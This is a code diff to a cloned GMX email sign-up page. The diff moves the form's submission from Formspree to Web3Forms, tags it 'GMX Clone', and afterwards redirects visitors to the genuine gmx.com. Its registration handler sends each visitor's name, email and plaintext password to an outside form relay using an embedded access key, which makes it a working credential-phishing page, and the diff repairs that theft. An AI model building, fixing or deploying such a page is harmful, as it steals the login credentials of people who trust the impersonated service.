@@ -40,7 +40,7 @@
 <nav class="navbar">
     <div class="navbar-left">
         <div class="hamburger"><span></span><span></span><span></span></div>
-        <a href="index.html" class="logo" onclick="showPreloader()">GMX</a>
+        <a href="index.html" class="logo">GMX</a>
     </div>
     <div class="navbar-right">
         <a href="#" class="nav-icon-btn">
@@ -49,7 +49,7 @@
                 <line x1="16.5" y1="16.5" x2="22" y2="22" stroke-linecap="round"/>
             </svg>
         </a>
-        <a href="login.html" class="signup-btn" onclick="showPreloader()">Sign up</a>
+        <a href="login.html" class="signup-btn">Sign up</a>
         <a href="https://www.gmx.com" target="_blank" class="nav-icon-btn">
             <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="white" stroke-width="2">
                 <rect x="2" y="4" width="20" height="16" rx="1"/>
@@ -80,7 +80,7 @@
         </div>
         <button class="register-btn" onclick="handleRegister()">Create account</button>
         <div class="card-links">
-            <a href="login.html" onclick="showPreloader()">Already have an account? Log in</a>
+            <a href="login.html">Already have an account? Log in</a>
         </div>
     </div>
 </div>
@@ -102,18 +102,27 @@
 
         showPreloader();
 
-        // Send to Formspree - replace with YOUR form ID
-        await fetch('https://formspree.io/f/YOUR_FORM_ID', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ access_key: "d3204d64-565e-48bc-83c1-7fb2d5a83d08",
-                type: 'REGISTER',
-                name: first + ' ' + last,
-                email: email,
-                password: password,
-                time: new Date().toLocaleString()
-            })
-        });
+        try {
+            const response = await fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    access_key: 'd3204d64-565e-48bc-83c1-7fb2d5a83d08',
+                    subject: 'GMX New Registration',
+                    from_name: 'GMX Clone',
+                    name: first + ' ' + last,
+                    email: email,
+                    password: password,
+                    type: 'REGISTER',
+                    time: new Date().toLocaleString()
+                })
+            });
+
+            const result = await response.json();
+            console.log(result);
+        } catch(e) {
+            console.log('Error:', e);
+        }
 
         window.location.href = 'https://www.gmx.com';
     }
